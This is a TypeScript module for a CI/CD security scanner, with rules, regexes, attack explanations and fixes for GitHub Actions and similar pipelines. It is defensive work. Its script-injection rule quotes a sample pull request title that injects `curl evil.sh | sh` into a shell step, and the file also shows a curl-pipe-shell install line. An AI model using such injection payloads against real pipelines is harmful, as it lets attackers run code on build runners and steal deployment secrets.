import type { RawFinding, RuleDoc, ScanContext, Scanner } from "../core/types.ts";
import { lineOf, matches } from "./_shared.ts";
import { safeSnippet } from "../core/redact.ts";
import { RISKY_INSTALL_PATTERNS } from "../data/packages.ts";

/**
 * CI/CD pipeline security.
 *
 * CI is the most under-defended high-privilege system in most organizations. It
 * holds deployment credentials, signing keys, and registry tokens, and its
 * configuration is edited far more casually than production code. The rules
 * here are among the highest-precision in the product because pipeline files
 * are small, declarative, and unambiguous.
 */

const RULES: RuleDoc[] = [
  {
    id: "CI-ACTION-UNPINNED",
    title: "GitHub Action referenced by a mutable tag",
    severity: "high",
    confidence: "confirmed",
    threat: "A tag can be repointed. Whoever controls the action repository controls your pipeline.",
    mappings: { cwe: ["CWE-829", "CWE-1357"], owasp: ["A08:2021"], compliance: ["SSDF:PW.4.1", "SLSA:L2"] },
  },
  {
    id: "CI-PWN-REQUEST",
    title: "pull_request_target used with a checkout of untrusted code",
    severity: "critical",
    confidence: "high",
    threat: "Runs attacker-supplied code with write permissions and access to repository secrets.",
    mappings: { cwe: ["CWE-94", "CWE-269"], owasp: ["A08:2021"] },
  },
  {
    id: "CI-SCRIPT-INJECTION",
    title: "Untrusted pipeline context interpolated into a shell step",
    severity: "critical",
    confidence: "high",
    threat: "A branch name or PR title containing shell metacharacters executes on the runner.",
    mappings: { cwe: ["CWE-78", "CWE-94"], owasp: ["A03:2021"] },
  },
  {
    id: "CI-BROAD-PERMISSIONS",
    title: "Workflow grants write permissions to the whole token",
    severity: "medium",
    confidence: "high",
    threat: "Any compromised step can push code, publish releases, or alter the repository.",
    mappings: { cwe: ["CWE-269"], owasp: ["A01:2021"], compliance: ["SLSA:L2"] },
  },
  {
    id: "CI-SECRET-TO-FORK",
    title: "Secrets exposed to workflows triggered by forks",
    severity: "high",
    confidence: "medium",
    threat: "Anyone who can open a pull request can read the secret.",
    mappings: { cwe: ["CWE-200"], owasp: ["A01:2021"] },
  },
  {
    id: "CI-HARDCODED-SECRET",
    title: "Credential written directly into a pipeline file",
    severity: "critical",
    confidence: "high",
    threat: "Pipeline files are readable by everyone with repository access, including forks.",
    mappings: { cwe: ["CWE-798"], owasp: ["A07:2021"], compliance: ["SOC2:CC6.1"] },
  },
  {
    id: "CI-CURL-PIPE-SHELL",
    title: "Pipeline downloads and executes remote code",
    severity: "high",
    confidence: "high",
    threat: "Unverified code runs on a runner that holds deployment credentials.",
    mappings: { cwe: ["CWE-494"], owasp: ["A08:2021"] },
  },
  {
    id: "CI-SELF-HOSTED-PUBLIC",
    title: "Self-hosted runner used in a public repository",
    severity: "high",
    confidence: "medium",
    threat: "Fork pull requests can execute code on infrastructure you own and that persists between jobs.",
    mappings: { cwe: ["CWE-668"], owasp: ["A08:2021"] },
  },
];

const IS_GH_WORKFLOW = /\.github\/workflows\/[^/]+\.ya?ml$/i;
const IS_GITLAB_CI = /(?:^|\/)\.gitlab-ci\.ya?ml$/i;
const IS_CIRCLE = /(?:^|\/)\.circleci\/config\.ya?ml$/i;
const IS_JENKINS = /(?:^|\/)Jenkinsfile$/i;

/** Pipeline contexts an outside contributor controls. */
const UNTRUSTED_CTX =
  /\$\{\{\s*(?:github\.event\.(?:issue|pull_request|comment|review|discussion|head_commit)\.(?:title|body|head\.ref|head\.label|user\.login|message)|github\.head_ref|github\.event\.inputs\.[A-Za-z0-9_]+)\s*\}\}/g;

/** Actions that are first-party and whose tags are comparatively trustworthy. */
const TRUSTED_ACTION_OWNERS = new Set(["actions", "github", "docker", "aws-actions", "azure", "google-github-actions"]);

export const ciScanner: Scanner = {
  name: "ci",
  title: "Build pipeline security",
  description:
    "Reviews your CI/CD workflows for the mistakes that let an outsider run code on your build machines or steal your deployment keys.",
  rules: RULES,

  appliesTo: (ctx) =>
    ctx.files.some(
      (f) => IS_GH_WORKFLOW.test(f) || IS_GITLAB_CI.test(f) || IS_CIRCLE.test(f) || IS_JENKINS.test(f),
    ),

  async scan(ctx: ScanContext): Promise<RawFinding[]> {
    const out: RawFinding[] = [];

    for (const file of ctx.files) {
      const isGh = IS_GH_WORKFLOW.test(file);
      const isOther = IS_GITLAB_CI.test(file) || IS_CIRCLE.test(file) || IS_JENKINS.test(file);
      if (!isGh && !isOther) continue;

      const text = await ctx.read(file);
      if (!text) continue;

      // --- Unpinned action references ---------------------------------------
      if (isGh) {
        for (const m of matches(/^\s*(?:-\s*)?uses\s*:\s*([^\s#]+)/gm, text)) {
          const ref = m[1].replace(/['"]/g, "");
          if (ref.startsWith("./") || ref.startsWith("docker://")) continue;
          const [pathPart, version] = ref.split("@");
          if (!version) continue;
          const owner = pathPart.split("/")[0];
          const pinned = /^[0-9a-f]{40}$/i.test(version);
          if (pinned) continue;

          const { line, text: lineText } = lineOf(text, m.index);
          const trusted = TRUSTED_ACTION_OWNERS.has(owner.toLowerCase());
          out.push({
            ruleId: "CI-ACTION-UNPINNED",
            title: `${pathPart} is pinned to the mutable tag "${version}"`,
            description:
              `${file} at line ${line} references ${pathPart}@${version}. Git tags are pointers and can be moved. If the action's maintainer account is compromised, the attacker repoints ${version} at their own commit and every workflow using it runs their code on the next build, with no change in your repository for anyone to review.` +
              (trusted
                ? " This action is published by a well-known organization, which lowers but does not remove the risk."
                : ""),
            severity: trusted ? "medium" : "high",
            confidence: "confirmed",
            evidence: `uses: ${pathPart}@${version} at ${file}:${line}`,
            exploit:
              "This is not hypothetical: in March 2025 the tj-actions/changed-files action was compromised and its tags repointed, causing thousands of repositories to leak CI secrets into public build logs on their next run. Pinning by commit hash was the only thing that prevented it.",
            remediation: {
              summary: "Pin the action to a full 40-character commit SHA and keep the tag as a trailing comment.",
              steps: [
                `Look up the commit SHA for ${pathPart}@${version} and replace the tag with it.`,
                `Write it as: uses: ${pathPart}@<40-char-sha>  # ${version}`,
                "Let Dependabot or Renovate propose SHA bumps so updates stay reviewable.",
                "Apply this to every third-party action. First-party actions are lower risk but the same attack applies.",
              ],
              codeFix: {
                language: "yaml",
                before: `uses: ${pathPart}@${version}`,
                after: `uses: ${pathPart}@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0  # ${version}`,
              },
            },
            mappings: {
              cwe: ["CWE-829", "CWE-1357"],
              owasp: ["A08:2021"],
              compliance: ["SSDF:PW.4.1", "SLSA:L2"],
            },
            tags: ["ci", "supply-chain", "github-actions"],
            location: { file, startLine: line, endLine: line, snippet: safeSnippet(lineText) },
          });
        }

        // --- pull_request_target with untrusted checkout ---------------------
        if (/on:\s*[\s\S]{0,400}?pull_request_target/.test(text)) {
          const checkoutRef = /uses\s*:\s*actions\/checkout@[^\n]*\n[\s\S]{0,300}?ref\s*:\s*\$\{\{\s*github\.event\.pull_request\.head\.(?:sha|ref)/.exec(text);
          const idx = checkoutRef?.index ?? text.indexOf("pull_request_target");
          const { line, text: lineText } = lineOf(text, Math.max(idx, 0));
          out.push({
            ruleId: "CI-PWN-REQUEST",
            title: checkoutRef
              ? "This workflow checks out fork code and runs it with full permissions"
              : "This workflow uses pull_request_target",
            description: checkoutRef
              ? `${file} triggers on pull_request_target and then checks out the pull request's head commit. pull_request_target runs in the context of the base repository, which means it has access to repository secrets and a write-capable token. Combining that with a checkout of the contributor's code hands both to anyone who opens a pull request.`
              : `${file} uses the pull_request_target trigger. Workflows on this trigger run with repository secrets and a write-capable token even for pull requests from forks. It is safe only if the workflow never executes any code or configuration from the pull request.`,
            severity: checkoutRef ? "critical" : "medium",
            confidence: checkoutRef ? "high" : "medium",
            evidence: `pull_request_target${checkoutRef ? " with a checkout of the PR head" : ""} in ${file}:${line}`,
            exploit:
              "An attacker forks the repository, edits a build script, a test file, or a dependency, and opens a pull request. Nobody needs to approve or merge it. The workflow checks out their code and runs it with your secrets in the environment, then they exfiltrate the secrets to their own server. This attack has a name in the security community because it happens so often.",
            remediation: {
              summary: "Use pull_request for anything that runs contributor code, and never check out untrusted code under pull_request_target.",
              steps: [
                "If the workflow needs to build or test the pull request, switch the trigger to pull_request. It runs without secrets and with a read-only token, which is correct.",
                "If it genuinely needs secrets, such as posting a comment, split it: build under pull_request, then act on the result in a separate workflow_run workflow that never checks out the contributor's code.",
                "Never combine pull_request_target with a checkout of github.event.pull_request.head.",
                "Require approval for workflow runs from first-time contributors in repository settings.",
              ],
            },
            mappings: { cwe: ["CWE-94", "CWE-269"], owasp: ["A08:2021"] },
            tags: ["ci", "github-actions", "privilege-escalation"],
            location: { file, startLine: line, endLine: line, snippet: safeSnippet(lineText) },
          });
        }

        // --- Script injection through untrusted context -----------------------
        for (const m of matches(UNTRUSTED_CTX, text)) {
          const before = text.slice(Math.max(0, m.index - 500), m.index);
          if (!/run\s*:\s*[|>]?/.test(before)) continue;
          const { line, text: lineText } = lineOf(text, m.index);
          out.push({
            ruleId: "CI-SCRIPT-INJECTION",
            title: "Attacker-controlled text is pasted straight into a shell command",
            description:
              `${file} at line ${line} interpolates ${m[0].trim()} into a run step. GitHub substitutes these expressions textually before the shell sees the script, so the value becomes part of the command rather than an argument to it. A pull request title or a branch name is chosen entirely by the person opening the pull request.`,
            severity: "critical",
            confidence: "high",
            evidence: `${m[0].trim()} inside a run: step at ${file}:${line}`,
            exploit:
              'An attacker opens a pull request titled `a"; curl evil.sh | sh; #`. The expression is substituted into the script, the shell parses their command, and it executes on your runner with whatever secrets that job holds.',
            remediation: {
              summary: "Pass the value through an environment variable and quote it, so the shell treats it as data.",
              steps: [
                "Move the expression into the step's env block.",
                'Reference it in the script as "$VARNAME", with quotes. Now it is a value, not code.',
                "Validate it if the script depends on its shape.",
              ],
              codeFix: {
                language: "yaml",
                before: `- run: echo "Title: ${"${{ github.event.pull_request.title }}"}"`,
                after: `- run: echo "Title: $PR_TITLE"\n  env:\n    PR_TITLE: ${"${{ github.event.pull_request.title }}"}`,
              },
            },
            mappings: { cwe: ["CWE-78", "CWE-94"], owasp: ["A03:2021"] },
            tags: ["ci", "github-actions", "injection"],
            location: { file, startLine: line, endLine: line, snippet: safeSnippet(lineText) },
          });
        }

        // --- Broad token permissions ----------------------------------------
        const permsWrite = /^\s*permissions\s*:\s*write-all\s*$/m.exec(text);
        const noPerms = !/^\s*permissions\s*:/m.test(text);
        if (permsWrite || noPerms) {
          const idx = permsWrite?.index ?? text.indexOf("jobs:");
          const { line, text: lineText } = lineOf(text, Math.max(idx, 0));
          out.push({
            ruleId: "CI-BROAD-PERMISSIONS",
            title: permsWrite
              ? "Workflow token has write access to everything"
              : "Workflow does not restrict its token permissions",
            description: permsWrite
              ? `${file} sets permissions to write-all. Every step in this workflow, including third-party actions, can push commits, create releases, open pull requests, and modify repository settings.`
              : `${file} does not declare a permissions block, so the workflow token gets whatever the repository default is. On older repositories that default is read and write for everything.`,
            severity: "medium",
            confidence: "high",
            evidence: permsWrite ? `permissions: write-all at ${file}:${line}` : `no permissions block in ${file}`,
            exploit:
              "A compromised third-party action, or an injected command, uses the ambient token to push a malicious commit to the default branch or publish a backdoored release. Because the token is legitimate, nothing looks anomalous in the audit log.",
            remediation: {
              summary: "Declare least-privilege permissions at the top of the workflow and widen only per job.",
              steps: [
                "Add `permissions: contents: read` at the workflow level.",
                "Grant additional scopes on the specific job that needs them, for example `pull-requests: write` on a commenting job.",
                "Set the organization default for the workflow token to read-only.",
              ],
              codeFix: { language: "yaml", after: "permissions:\n  contents: read\n\njobs:\n  build:\n    # widen only where genuinely needed\n    permissions:\n      contents: read\n      pull-requests: write" },
            },
            mappings: { cwe: ["CWE-269"], owasp: ["A01:2021"], compliance: ["SLSA:L2"] },
            tags: ["ci", "github-actions", "least-privilege"],
            location: { file, startLine: line, endLine: line, snippet: safeSnippet(lineText) },
          });
        }

        // --- Self-hosted runners --------------------------------------------
        for (const m of matches(/runs-on\s*:\s*\[?\s*['"]?self-hosted/g, text)) {
          const { line, text: lineText } = lineOf(text, m.index);
          out.push({
            ruleId: "CI-SELF-HOSTED-PUBLIC",
            title: "Workflow runs on a self-hosted runner",
            description:
              `${file} at line ${line} runs on a self-hosted runner. Self-hosted runners are not ephemeral by default: state left by one job is visible to the next. If this repository is public, or ever becomes public, fork pull requests can execute on your own infrastructure.`,
            severity: "high",
            confidence: "medium",
            evidence: `runs-on: self-hosted at ${file}:${line}`,
            exploit:
              "An attacker opens a pull request whose build step installs a persistent implant on the runner. Later jobs, including deployment jobs holding production credentials, run on the same machine, and the implant reads their secrets.",
            remediation: {
              summary: "Use ephemeral runners, and never allow fork pull requests onto self-hosted infrastructure.",
              steps: [
                "Configure runners as ephemeral so each job gets a fresh environment.",
                "For public repositories, use GitHub-hosted runners for anything triggered by pull requests.",
                "Require approval for all outside-contributor workflow runs.",
                "Isolate runners on their own network segment with no access to production.",
              ],
            },
            mappings: { cwe: ["CWE-668"], owasp: ["A08:2021"] },
            tags: ["ci", "github-actions", "runner"],
            location: { file, startLine: line, endLine: line, snippet: safeSnippet(lineText) },
          });
        }
      }

      // --- Applies to every CI system ---------------------------------------
      for (const re of RISKY_INSTALL_PATTERNS) {
        for (const m of matches(re, text)) {
          const { line, text: lineText } = lineOf(text, m.index);
          out.push({
            ruleId: "CI-CURL-PIPE-SHELL",
            title: "Pipeline downloads and immediately executes remote code",
            description:
              `${file} at line ${line} fetches something over the network and pipes it straight into a shell. The runner executes whatever that server returns at that moment, with no signature check and nothing recorded about what actually ran.`,
            severity: "high",
            confidence: "high",
            evidence: `${m[0].slice(0, 140)} at ${file}:${line}`,
            exploit:
              "Anyone who compromises that host, hijacks the domain, or intercepts the request gets code execution on a machine holding your deployment credentials, signing keys, and registry tokens. Your build then ships whatever they inserted.",
            remediation: {
              summary: "Pin the artifact, verify a checksum, then execute.",
              steps: [
                "Download to a file, verify a published SHA-256 checksum or signature, and only then execute it.",
                "Prefer installing through a package manager where integrity is checked for you.",
                "For frequently used tooling, vendor a pinned copy or build your own runner image.",
              ],
              codeFix: {
                language: "bash",
                before: "curl -sSL https://example.com/install.sh | sh",
                after: 'curl -sSLo install.sh https://example.com/install.sh\necho "<known-sha256>  install.sh" | sha256sum -c -\nsh install.sh',
              },
            },
            mappings: { cwe: ["CWE-494", "CWE-829"], owasp: ["A08:2021"] },
            tags: ["ci", "supply-chain"],
            location: { file, startLine: line, endLine: line, snippet: safeSnippet(lineText) },
          });
        }
      }

      // Hardcoded credentials in pipeline files
      for (const m of matches(
        /^\s*(?:-\s*)?(?:[A-Za-z0-9_]*(?:TOKEN|SECRET|PASSWORD|API_KEY|APIKEY|ACCESS_KEY|CREDENTIAL)[A-Za-z0-9_]*)\s*[:=]\s*['"]?((?!\$\{|\$\(|secrets\.|env\.|vars\.|\$[A-Z])[^\s'"#]{12,})['"]?\s*$/gim,
        text,
      )) {
        const { line, text: lineText } = lineOf(text, m.index);
        out.push({
          ruleId: "CI-HARDCODED-SECRET",
          title: "Credential written directly into the pipeline file",
          description:
            `${file} at line ${line} assigns a credential-shaped value literally rather than referencing a secret store. Pipeline files are committed, visible to everyone with repository read access, and copied into every fork.`,
          severity: "critical",
          confidence: "high",
          evidence: `credential-shaped assignment at ${file}:${line}`,
          exploit:
            "Anyone with repository access, including every fork of a public repository, has the credential. CI credentials tend to be the most privileged an organization has, because they exist to deploy.",
          remediation: {
            summary: "Move the value into your CI secret store and reference it, then rotate it.",
            steps: [
              "Store it as a repository or organization secret and reference it, for example ${{ secrets.NAME }}.",
              "Rotate the credential at its provider. It is in git history permanently.",
              "Prefer short-lived OIDC federation over long-lived static credentials where your cloud supports it.",
            ],
            outOfBandAction: "Rotate this credential. It is in the repository history and cannot be un-published.",
          },
          mappings: { cwe: ["CWE-798"], owasp: ["A07:2021"], compliance: ["SOC2:CC6.1"] },
          tags: ["ci", "secret"],
          location: { file, startLine: line, endLine: line, snippet: safeSnippet(lineText) },
        });
      }
    }

    return out;
  },
};
